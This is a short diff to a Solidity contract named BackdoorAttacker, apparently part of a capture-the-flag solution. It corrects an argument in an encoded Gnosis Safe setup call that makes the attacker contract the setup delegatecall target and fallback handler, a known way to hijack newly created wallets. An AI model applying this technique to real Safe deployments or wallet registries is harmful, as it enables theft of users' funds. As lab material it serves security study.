@@ -27,7 +27,7 @@ contract BackdoorAttacker {
 
             bytes memory initializer2 = abi.encodeWithSignature(
                 "setup(address[],uint256,address,bytes,address,address,uint256,address)",
-            _owners, 1, address(this), data, address(this), 0, 0, msg.sender);
+            _owners, 1, address(this), data, address(this), address(0), 0, msg.sender);
 
             GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(singleton, initializer2, 0, wallet);
 
